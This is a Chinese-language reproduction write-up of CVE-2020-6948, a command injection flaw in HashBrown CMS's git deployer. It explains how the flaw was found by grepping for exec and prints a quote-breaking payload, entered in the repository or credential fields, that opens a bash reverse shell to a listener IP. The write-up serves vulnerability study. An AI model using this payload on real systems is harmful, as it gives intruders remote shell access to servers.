---
title: （CVE-2020-6948）HashBrown CMS 远程命令执行漏洞
id: zhfly2964
---

# （CVE-2020-6948）HashBrown CMS 远程命令执行漏洞

## 一、漏洞简介

HashBrown CMS是一套开源的无头内容管理系统（CMS）。 HashBrown CMS 1.3.3及之前版本中存在远程代码执行漏洞，该漏洞源于程序没有进行正确的安全检查。攻击者可利用该漏洞执行代码。

## 二、漏洞影响

HashBrown CMS 1.3.3

## 三、复现过程

在之前收集的资料里面总结了发现漏洞基本有三个方法：

*   通过关键字搜索，比如exec方法在很多语言里面代表执行系统命令，那你就可以搜索查看传入exec方法的参数有没有经过过滤，有没有办法利用。https://github.com/wireghoul/graudit 这个项目就罗列了很多语言的关键词可以用作参考。
*   根据function来阅读代码，但是这种方法花费的时间比第一种多，有可能迷失在各种各种各样的方法中。
*   通读代码，这样最全，但是显然速度要慢很多了。

对于Hashbrown CMS，先用第一种方法开路。尝试了几个关键字之后我选取了exec这个关键字。在grep 之后发现了下面的结果。

![image](../img/0ca76dccc4bb1688f8b32eee76d34890.png)

看来这个应用使用git 相关命令，如果可以传入url 参数就有可能触发命令执行漏洞。接着打开Server/Entity/Deployer/GitDeployer.js 文件查看源代码。

![image](../img/10bf938c493402bbc2e3a8e8f84d6591.png)

其中可以看到url由username，password，和repro 几个变量拼接，而且其中没有过滤特殊的字符和命令。那接下来就是到页面里面寻找触发的点。经过对这个应用的一番熟悉，得知可以在登录后建立新的connection选择git部署的方式，在Repository，Branch，username或者password字段填写你要执行的命令即可。但是这里要注意程序本来的exec命令中填写有单引号，我们要对其进行闭合，比如填入如下命令来反弹一个shell。

```
https://google.com' & /bin/bash -c 'bash -i >& /dev/tcp/192.168.119.149/8888 0>&1 
```

配置如下：

![image](../img/28d40437f3002fd2be223cc0a7d02623.png)

然后点击media菜单触发git命令执行

![image](../img/a99c5d589913971ec98c7ae38c21b894.png)

接下来在监听的机器上就可以获得shell了

![image](../img/49a857884061e89c0b10e969064c5aa8.png)

## 参考链接

> https://mp.weixin.qq.com/s?__biz=MjM5MDYxODkyMA==&mid=2651345793&idx=1&sn=02381bb3dbd4679b12be4628d665e815&chksm=bdbef7c68ac97ed063e8df46a42e2a111dfd52f108f6b267f8dfc183b6b0ed3f87b6af757487&mpshare=1&scene=1&srcid=&sharer_sharetime=1582514363054&sharer_shareid=346bf064ccfaeb680ec3e1af3a4fc9a8&key=019d47c25aa835ac2d58a398c473737e01644761ca991f7009ada9eb1ef69e4dd41b2008c27db720006e0858455f920d0801d9feae53aa4314f05d6e310a7290ae2b93e17343c13f6a9f2ce360254195&ascene=1&uin=MTU0OTU5NDkzMA%3D%3D&devicetype=Windows+10&version=62080079&lang=zh_CN&exportkey=AZc%2BxZJwp8CueCtaKThWQrI%3D&pass_ticket=l4uNHDrGwGqrS%2BmJVv56i4FzemghweUeBbN1BEETCGd3TqEDSTcwvRMSxogubM8j